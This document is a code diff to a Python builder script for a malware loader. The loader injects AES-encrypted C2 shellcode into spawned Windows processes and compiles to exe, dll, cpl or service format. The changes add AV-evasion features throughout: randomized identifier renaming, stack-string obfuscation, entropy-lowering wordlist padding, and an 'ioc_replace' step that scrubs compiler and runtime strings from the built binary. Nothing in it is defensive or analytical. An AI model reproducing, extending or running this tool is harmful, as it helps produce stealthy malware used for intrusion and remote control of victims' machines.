@@ -14,6 +14,7 @@ import json
 import os
 import re
 import sys
+from pathlib import Path
 
 timestamp = date.today()
 
@@ -63,7 +64,6 @@ def parse_args():
 	parser.add_argument('--ProcessCreate', choices=get_available_injection_snippets('ProcessCreate'))
 	parser.add_argument('--ProcessOpen', choices=get_available_injection_snippets('ProcessOpen'))
 	parser.add_argument('--ProtectMemory', choices=get_available_injection_snippets('ProtectMemory'))
-	parser.add_argument('--ThreadOpen', choices=get_available_injection_snippets('ThreadOpen'))
 	parser.add_argument('--WriteMemory', choices=get_available_injection_snippets('WriteMemory'))
 	args, unknown = parser.parse_known_args()
 	if args.help:
@@ -205,16 +205,7 @@ def show_help():
 					description = line[len("// Description:"):].strip()
 					break
 		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
-	print(f"\n  --ThreadOpen \t\tSnippet for get thread handle. Options:")
-	snippets = get_available_injection_snippets("ThreadOpen")
-	for snippet in snippets:
-		with open(f"Snippets/Injection/ThreadOpen/{snippet}.c", "r") as file:
-			description = "No description"
-			for line in file:
-				if line.startswith("// Description:"):
-					description = line[len("// Description:"):].strip()
-					break
-		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
+
 	print(f"\n  --ExecuteMemory \tSnippet for executing memory. Options:")
 	snippets = get_available_injection_snippets("ExecuteMemory")
 	for snippet in snippets:
@@ -225,10 +216,12 @@ def show_help():
 					description = line[len("// Description:"):].strip()
 					break
 		print(f"\t\t\t\033[90m{snippet} ({description})\033[0m")
-	print(f"\n  Example: \033[90mpython3 {Projectname}.py -w Top100WinBin Top1000Alexa -o /User/Desktop/Loader1 -a x64 -d example1.local example2.local -s testsign -f cpl -c2f /User/Desktop/met.bin -c2m /User/Desktop/met.bin --c2_slow /User/Desktop/met.bin -ff hh.exe -fm werfault.exe -fs powershell.exe --bypass BlockDlls --control Mutex --ProcessCreate CreateProcessA --ProcessOpen OpenProcess --AllocMemory VirtualAllocEx --WriteMemory WriteProcessMemory --ProtectMemory VirtualProtect --ThreadOpen SomeThreadShitHere --ExecuteMemory QueueAPC && cd /User/Desktop/Loader1 && make\033[0m")
+
+
+	print(f"\nExample: python3 {Projectname}.py {Grey} -d example.local -c default.conf --c2_fast /Users/user/Desktop/Work/2.Project/Payloads/Shellcodes/12.fast_30_ekko_syscall_syscall_noproxy.bin  --fork_fast 'C:\\\Windows\\\system32\\\\notepad.exe' -w APT28  --AllocMemory VirtualAllocEx_Dyn -f cpl -sc test.json {White}\n")
 
 def validate_args(args):
-	obligatory_args = ['AllocMemory', 'ExecuteMemory', 'ProcessCreate', 'ProcessOpen', 'ProtectMemory', 'ThreadOpen', 'WriteMemory', 'arch', 'domains', 'format', 'c2_fast', 'fork_fast']
+	obligatory_args = ['AllocMemory', 'ExecuteMemory', 'ProcessCreate', 'ProcessOpen', 'ProtectMemory', 'WriteMemory', 'arch', 'domains', 'format', 'c2_fast', 'fork_fast']
 	missing_args = [arg for arg in obligatory_args if not getattr(args, arg)]
 	if missing_args:
 		print(f"\n\033[91m[-] Error: Missing required arguments:\033[0m", ", ".join(missing_args), "\n")
@@ -255,6 +248,8 @@ def create_wordlist_header_files(wordlists, path_to_wordlists, path_to_output):
 					words = wl_file.readlines()
 				if not words:
 					continue
+				percentage = random.uniform(0.1, 0.3)  # Generate a random percentage between 30% and 50%
+				words = random.sample(words, k=int(len(words) * percentage))  # Select words
 				for word in words:
 					var_name = generate_random_var_name()
 					var_value = word.strip()
@@ -263,6 +258,22 @@ def create_wordlist_header_files(wordlists, path_to_wordlists, path_to_output):
 				print(f"Error: File {wordlist} not found in directory {path_to_wordlists}.")
 				continue
 		file.write('\n#endif // ENTROPY_DECREASE\n')
+
+def obfuscate_words(src_files, target_words, domains):
+	def random_string(length):
+		letters = string.ascii_letters
+		return ''.join(random.choice(letters) for i in range(length))
+	replacements = {}
+	for i, domain in enumerate(domains, start=1):
+		for target_word in target_words:
+			key = f'{target_word}_{i}'
+			replacements[key] = random_string(15)
+	for src_file in src_files:
+		text = Path(src_file).read_text()
+		for target, replacement in replacements.items():
+			pattern = re.compile(target)
+			text = pattern.sub(replacement, text)
+		Path(src_file).write_text(text)
 
 def prepare_project(args):
 	domain_count = 0
@@ -367,13 +378,6 @@ def prepare_project(args):
 	with open('tmp/main.c', 'w') as f:
 		f.write(main_content)
 
-	with open("Snippets/Injection/ThreadOpen/" + args.ThreadOpen + ".c", 'r') as f:
-		tmp_content = f.read()
-	with open('tmp/main.c', 'r') as f:
-		main_content = f.read()
-	main_content = main_content.replace('// ThreadOpen_replace', tmp_content)
-	with open('tmp/main.c', 'w') as f:
-		f.write(main_content)
 
 	with open("Snippets/Injection/ExecuteMemory/" + args.ExecuteMemory + ".c", 'r') as f:
 		tmp_content = f.read()
@@ -395,7 +399,7 @@ def prepare_project(args):
 		if args.c2_medium and args.fork_medium:
 			output_medium += f"\t\tgo(PROC_TO_INJECT_MEDIUM, shellcode_medium_{domain_count}, sizeof(shellcode_medium_{domain_count}));\n"
 		if args.c2_slow and args.fork_slow:
-			output_slow += f"\t\tgo(PROC_TO_INJECT_SLOW, shellcode_slow_{domain_count}, sizeof(shellcode_medium_{domain_count}));\n"
+			output_slow += f"\t\tgo(PROC_TO_INJECT_SLOW, shellcode_slow_{domain_count}, sizeof(shellcode_slow_{domain_count}));\n"
 	with open('tmp/main.c', 'r') as file:
 		filedata = file.read()
 	filedata = filedata.replace('// fast_section_replace', output_fast)
@@ -435,6 +439,11 @@ def prepare_project(args):
 		main_c_contents = re.sub('// Bypass_replace', replacement_text, main_c_contents)
 		with open('tmp/main.c', 'w') as file:
 			file.write(main_c_contents)
+
+	src_files = ['tmp/Shellcode.h', 'tmp/Main.c']
+	target_words = ['shellcode_fast', 'shellcode_medium', 'shellcode_slow']
+	obfuscate_words(src_files, target_words, args.domains)
+
 	pass
 
 def bin_to_aes_shellcode(path_to_bin, key, variable_name):
@@ -459,14 +468,10 @@ def bin_to_aes_shellcode(path_to_bin, key, variable_name):
 	return debug_info + output
 
 def create_shellcode_from_bin(path_to_bin, variable_name):
-	# Run hexdump command to get shellcode
 	process = subprocess.Popen(['hexdump', '-v', '-e', r'"\\x" 1/1 "%02x"', path_to_bin], stdout=subprocess.PIPE)
 	output, _ = process.communicate()
 	shellcode = output.decode().replace('\n', '')
-
-	# Generate the C variable declaration
 	c_variable = f'char {variable_name}[] = "{shellcode}";'
-
 	return c_variable
 
 def show_project_info(args):
@@ -495,7 +500,6 @@ def show_project_info(args):
 	print(f"\033[92m[+]\033[0m AllocMemory: {Grey}-----------------> {White}{args.AllocMemory}{Default}")
 	print(f"\033[92m[+]\033[0m WriteMemory: {Grey}-----------------> {White}{args.WriteMemory}{Default}")
 	print(f"\033[92m[+]\033[0m ProtectMemory: {Grey}---------------> {White}{args.ProtectMemory}{Default}")
-	print(f"\033[92m[+]\033[0m ThreadOpen: {Grey}------------------> {White}{args.ThreadOpen}{Default}")
 	print(f"\033[92m[+]\033[0m ExecuteMemory: {Grey}---------------> {White}{args.ExecuteMemory}{Default}")
 	print(f"\n{Grey}#################### {White} Exec flow {Grey} #####################{Default}")
 	print(f"\n{White}{args.bypass}{Grey}-->{White}{args.control}{Grey}-->")
@@ -508,11 +512,11 @@ def show_project_info(args):
 	for domain in args.domains:
 		domain_count = domain_count + 1
 		if args.c2_fast and args.fork_fast:
-			print(f"		{Grey}-->{White}AESDecrypt {Grey}fast c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ThreadOpen}{Grey}-->{White}{args.ExecuteMemory}")
+			print(f"		{Grey}-->{White}AESDecrypt {Grey}fast c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
 		if args.c2_medium and args.fork_medium:
-			print(f"		{Grey}-->{White}AESDecrypt {Grey}medium c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_medium}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ThreadOpen}{Grey}-->{White}{args.ExecuteMemory}")
+			print(f"		{Grey}-->{White}AESDecrypt {Grey}medium c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_medium}{White}){Grey}-->{White}{args.ProcessOpen}{Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
 		if args.c2_slow and args.fork_slow:
-			print(f"		{Grey}-->{White}AESDecrypt {Grey}slow c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ThreadOpen}{Grey}-->{White}{args.ExecuteMemory}")
+			print(f"		{Grey}-->{White}AESDecrypt {Grey}slow c2{White} shellcode (Key:{Grey} {domain}{White}){Grey} -->{White}{args.ProcessCreate} ({Grey}{args.fork_fast}{White}){Grey}-->{White}{args.AllocMemory}{Grey}-->{White}{args.WriteMemory}{Grey}-->{White}{args.ProtectMemory}{Grey}-->{White}{args.ExecuteMemory}")
 	print("")
 
 
@@ -548,13 +552,24 @@ def tmp_move2(args):
 def create_makefile(args, projectname):
 	if args.arch == 'x64':
 		compiler = "x86_64-w64-mingw32-gcc"
-		compiler_args = " -Os -s -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident "
+		compiler_args = " -Os -s -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident -masm=intel -static-libgcc "
 	elif args.arch == 'x86':
 		compiler = "i686-w64-mingw32-gcc"
 		compiler_args = " -Os -s -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident "
 
 	if not args.debug:
 		compiler_args += "-mwindows "
+
+	if args.format == 'cpl':
+		compiler_args += "-shared "
+		outformat = "cpl"
+	if args.format == 'dll':
+		compiler_args += "-shared "
+		outformat = "dll"
+	if args.format == 'exe':
+		outformat = "exe"
+	if args.format == 'service':
+		outformat = "exe"
 
 	if args.debug:
 		compiler_args += "-DDEBUG "
@@ -566,7 +581,7 @@ def create_makefile(args, projectname):
 		compiler_args += "-DSLOWC2 "
 	makefile_content = f'''
 all:
-\t{compiler} {compiler_args} -o build/{projectname}.exe src/*.c
+\t{compiler} {compiler_args} -o build/{projectname}.{outformat} src/*.c
 	'''
 	with open('tmp/Makefile', 'w') as f:
 		f.write(makefile_content)
@@ -610,6 +625,70 @@ def analyze_pe_file(filename):
 		for s in strings:
 			print(s.decode(errors='ignore'))
 
+def save_config(filename, args):
+	args_dict = vars(args)
+	#if 'c2_fast' in args_dict:
+	#	del args_dict['c2_fast']
+	#if 'c2_medium' in args_dict:
+	#	del args_dict['c2_medium']
+	#if 'c2_slow' in args_dict:
+	#	del args_dict['c2_slow']
+	if 'save_config' in args_dict:
+		del args_dict['save_config']
+	if 'config' in args_dict:
+		del args_dict['config']
+	if 'output' in args_dict:
+		del args_dict['output']
+
+	with open(filename, 'w') as outfile:
+		json.dump(args_dict, outfile, indent=4)
+
+def ioc_replace(file_path, target_string):
+	with open(file_path, "rb") as f:
+		data = f.read()
+	data_str = data.decode('ISO-8859-1')
+	occurrences = [m.start() for m in re.finditer(re.escape(target_string), data_str)]
+	for start_index in occurrences:
+		random_string = ''.join(random.choice(string.ascii_letters) for _ in range(len(target_string)))
+		data_str = data_str[:start_index] + random_string + data_str[start_index + len(target_string):]
+	data_bytes = data_str.encode('ISO-8859-1')
+	with open(file_path, "wb") as f:
+		f.write(data_bytes)
+
+def obfuscate_strings(file_path):
+	try:
+		with open(file_path, 'r') as file:
+			lines = file.readlines()
+	except FileNotFoundError:
+		print(f"File {file_path} not found.")
+		return
+	pattern = re.compile(r'(<obf>.*?<ob_end>)')
+	unescaped_quotes = re.compile(r'(?<!\\)"')
+	valid_char = re.compile(r'[^a-zA-Z0-9_]')
+	new_lines = []
+	for line in lines:
+		matches = pattern.findall(line)
+		if matches:
+			for match in matches:
+				entire_obf = match
+				variable = entire_obf[5:-8]  # remove <obf> and <ob_end>
+				variable = unescaped_quotes.sub('', variable)  # remove unescaped quotes
+				random_letters = ''.join(random.choice(string.ascii_letters) for _ in range(20))
+				array_name = valid_char.sub('_', variable) + random_letters
+				array_declaration = f'char {array_name}[{len(variable) + 1}];\n'
+				assignments = [f'{array_name}[{i}] = \'{c}\';' for i, c in enumerate(variable)]
+				assignments.append(f'{array_name}[{len(variable)}] = 0;')
+				random.shuffle(assignments)  # shuffle assignment lines
+				array_assignment = '\n'.join(assignments) + '\n'
+				array_declaration += array_assignment
+				line = array_declaration + line.replace(entire_obf, array_name)
+			new_lines.append(line)
+		else:
+			new_lines.append(line)
+	with open(file_path, 'w') as file:
+		for line in new_lines:
+			file.write(line)
+
 def main():
 	projectname = ''.join(random.choices(string.ascii_letters, k=10))
 	args = parse_args()
@@ -631,11 +710,56 @@ def main():
 	project_data = prepare_project(args)
 	tmp_move1()
 	create_makefile(args, projectname)
+
+	obfuscate_strings("tmp/src/Main.c")
+
 	run_make()
-	analyze_pe_file(f"tmp/build/{projectname}.exe")
+
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'test')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'GCC: (GNU) 12.1.0')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Mingw-w64 runtime failure:')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Address %p has no image-section')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Argument domain error (DOMAIN)')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Argument singularity (SIGN)')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Overflow range error (OVERFLOW)')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Partial loss of significance (PLOSS)')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Total loss of significance (TLOSS)')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'The result is too small to be represented (UNDERFLOW)')
+
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  VirtualQuery failed for %d bytes at address %p')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  VirtualProtect failed with code 0x%x')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  Unknown pseudo relocation protocol version %d.')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '  Unknown pseudo relocation bit size %d.')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', '_matherr(): %s in %s(%g, %g)  (retval=%g)')
+
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'Unknown error')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllGetClassObject')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllRegisterServer')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllRegisterServerEx')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'DllUnregisterServer')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ExecuteMemory')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'PayloadControl')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProcessCreate')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProcessOpen')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'ProtectMemory')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'WriteMemory')
+	ioc_replace(f'tmp/build/{projectname}.{args.format}', 'test')
+
+	if args.format == 'cpl':
+		outformat = "cpl"
+	if args.format == 'dll':
+		outformat = "dll"
+	if args.format == 'exe':
+		outformat = "exe"
+	if args.format == 'service':
+		outformat = "exe"
+	analyze_pe_file(f"tmp/build/{projectname}.{outformat}")
 	if args.output:
 		tmp_move2(args)
 	print("")
+	if args.save_config:
+		save_config(args.save_config, args)
 
 if __name__ == "__main__":
 	main()
